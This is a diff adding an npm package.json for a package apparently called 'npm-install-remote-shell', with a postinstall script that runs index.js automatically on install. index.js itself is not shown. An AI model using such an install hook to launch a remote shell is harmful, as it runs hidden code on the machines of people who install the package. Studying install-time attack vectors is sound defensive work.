@@ -1,0 +1,11 @@
+{
+  "name": "npm-install-remote-shell",
+  "version": "1.1.4",
+  "description": "",
+  "main": "index.js",
+  "scripts": {
+    "postinstall": "node ./index.js"
+  },
+  "license": "ISC",
+  "type": "commonjs"
+}
